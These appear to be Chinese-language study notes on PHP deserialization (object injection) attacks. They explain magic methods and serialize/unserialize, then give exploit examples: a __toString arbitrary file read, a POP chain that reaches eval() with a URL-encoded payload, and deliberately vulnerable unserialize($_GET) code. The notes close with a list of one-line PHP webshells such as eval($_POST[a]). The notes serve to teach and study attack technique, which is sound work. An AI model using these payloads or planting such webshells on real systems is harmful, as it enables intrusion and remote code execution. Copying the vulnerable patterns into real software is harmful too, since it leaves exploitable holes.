__construct(), __destruct(), __call(), __callStatic(), __get(), __set(), __isset(), __unset(), __sleep(), __wakeup(), __toString(), __invoke(), __set_state(), __clone(), and __autoload().

如果对象将调用一个不存在的函数__call将被调用；如果对象试图访问不存在的类变量__get和__set将被调用。但是利用这种漏洞并不局限于magic函数，在普通的函数上也可以采取相同的思路。例如User类可能定义一个get方法来查找和打印一些用户数据，但是其他类可能定义一个从数据库获取数据的get方法，这从而会导致SQL注入漏洞。set或write方法会将数据写入任意文件，可以利用它获得远程代码执行。唯一的技术问题是注入点可用的类，但是一些框架或脚本具有自动加载的功能。

<?php  
   
class TestClass  
{  
    // 一个变量     
    public $variable = 'This is a string';  
   
    // 一个简单的方法    
    public function PrintVariable()  
    {  
        echo $this->variable . '<br />';  
    }  
   
    // Constructor    
    public function __construct()  
    {  
        echo '__construct <br />';  
    }  
   
    // Destructor   
    public function __destruct()  
    {  
        echo '__destruct <br />';  
    }  
   
    // Call  
    public function __toString()  
    {  
        return '__toString<br />';  
    }  
}  
   
// 创建一个对象  
//  __construct会被调用    
$object = new TestClass();     
// 创建一个方法     
$object->PrintVariable();    
// 对象被当作一个字符串  
//  __toString会被调用     
echo $object;    
// End of PHP script  
// 脚本结束__destruct会被调用  
   
?> 

serialize和unserialize就是用来解决这一问题的。serialize可以将变量转换为字符串并且在转换中可以保存当前变量的值；unserialize则可以将serialize生成的字符串变换回变量。
php允许保存一个对象（数组）方便以后重用，这个过程被称为序列化。为什么要有序列化这种机制呢?在传递变量的过程中，有可能遇到变量值要跨脚本文件传递的过程。

<?php    
// 某类   
class User  
{  
    // 类数据  
    public $age = 0;  
    public $name = '';  
   
    // 类方法 ：输出数据    
    public function PrintData()  
    {  
        echo 'User ' . $this->name . ' is ' . $this->age  
             . ' years old. <br />';  
    }  
}  
   
// 创建一个对象   
$usr = new User();  
   
// 设置数据   
$usr->age = 20;  
$usr->name = 'John';  
   
// 输出数据   
$usr->PrintData();  
   
// 输出序列化之后的数据   
echo serialize($usr);  
   
?> 


unserialize重建对象
<?php  
   
// 某类  
   
class User  
{  
    // Class data  
   
    public $age = 0;  
    public $name = '';  
   
    // Print data  
   
    public function PrintData()  
    {  
        echo 'User ' . $this->name . ' is ' . $this->age . ' years old. <br />';  
    }  
}  
   
// 重建对象  
   
$usr = unserialize('O:4:"User":2:{s:3:"age";i:20;s:4:"name";s:4:"John";}');  
   
// 调用PrintData 输出数据  
   
$usr->PrintData();  
   
?> 



magic函数的例子
<?php  
   
class Test  
{  
    public $variable = 'BUZZ';  
    public $variable2 = 'OTHER';  
   
    public function PrintVariable()  
    {  
        echo $this->variable . '<br />';  
    }  
   
    public function __construct()  
    {  
        echo '__construct<br />';  
    }  
   
    public function __destruct()  
    {  
        echo '__destruct<br />';  
    }  
   
    public function __wakeup()  
    {  
        echo '__wakeup<br />';  
    }  
   
    public function __sleep()  
    {  
        echo '__sleep<br />';  
   
        return array('variable', 'variable2');  
    }  
}  
   
// 创建对象调用__construct
   
$obj = new Test();  
   
// 序列化对象调用__sleep  
   
$serialized = serialize($obj);  
   
// 输出序列化后的字符串  
   
print 'Serialized: ' . $serialized . '<br />';  
   
// 重建对象调用__wakeup  
   
$obj2 = unserialize($serialized);  
   
// 调用PintVariable输出数据 
   
$obj2->PrintVariable();  
   
// 脚本结束调用__destruct   
   
?> 


漏洞利用：在变量可控并且进行了unserialize操作的地方注入序列化对象，实现代码执行
{
三个条件:
1、应用程序中必须含有一个实现某个PHP魔幻方法（例如__wakeup或者__destruct）的类，可以用这个类进行恶意攻击，或者开始一个“POP链”。
2、当调用脆弱的unserialize()时，必须声明攻击期间所使用的所有类，否则必须为这些类支持对象自动加载。
3、传递给反序列化操作的数据必须来自于一个文件，所以服务器上必须包含有一个包含序列化数据的文件。

to_string利用举例
<?php   
  //test.php
// … 一些include ...  
   
class FileClass  
{  
    // 文件名  
   
    public $filename = 'error.log';  
   
    // 当对象被作为一个字符串会读取这个文件  
   
    public function __toString()  
    {  
        return file_get_contents($this->filename);  
    }  
}  
   
// Main User class  
   
class User  
{  
    // Class data  
   
    public $age = 0;  
    public $name = '';  
   
    // 允许对象作为一个字符串输出上面的data  
   
    public function __toString()  
    {  
        return 'User ' . $this->name . ' is ' . $this->age . ' years old. <br />';  
    }  
}  
   
// 用户可控  
   
$obj = unserialize($_GET['usr_serialized']);  
   
// 输出__toString  
   
echo $obj;  
   
?> 

 <?php    
      //POC.PHP
    include 'test.php';    
    $fileobj = new FileClass();    
    $fileobj->filename = '1.txt';    
         
    echo serialize($fileobj);    
         
    ?>   
}	
	
pop链利用
{
1.反序列化可以控制类属性，无论是private还是public
<?php
class A {
    private $a = "a";
    public $b = "b";
    static $c = "c";
}
$test = new A();
echo urlencode(serialize($test));

O%3A1%3A%22A%22%3A2%3A%7Bs%3A4%3A%22%00A%00a%22%3Bs%3A1%3A%22a%22%3Bs%3A1%3A%22b%22%3Bs%3A1%3A%22b%22%3B%7D
结果中有个%00存在是因为private属性。

2.以前理解的序列化攻击更多的是在魔术方法中出现一些利用的漏洞，因为自动调用从而触发漏洞。
但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。
<?php
class lemon {
    protected $ClassObj;

    function __construct() {
        $this->ClassObj = new normal();
    }

    function __destruct() {
        $this->ClassObj->action();
    }
}

class normal {
    function action() {
        echo "hello";
    }
}

class evil {
    private $data;
    function action() {
        eval($this->data);
    }
}

unserialize($_GET['d']);
?>


lemon这个类本来是调用，normal类的，但是现在action方法在evil类里面也有，所以可以构造pop链，调用evil类中的action方法。
<?php
class lemon {
    protected $ClassObj;
    function __construct() {
        $this->ClassObj = new evil();
    }
}
class evil {
    private $data = "phpinfo();";
}
echo urlencode(serialize(new lemon()));
echo "\n\r";
?>

注意的是，protected $ClassObj = new evil();是不行的，还是通过__construct来实例化。
生成poc:
O%3A5%3A%22lemon%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D

获取已经包含的文件：
get_included_files()
获取已经定义的类：
get_declared_classes()
加载所有类
__autoload()
}

}

}







常用webshell总结
{
	一句话
	{
		<?php eval($_POST[a]); ?>
		<script language="php">eval($_POST[a]);</script>
		
		
		
	}
	
}

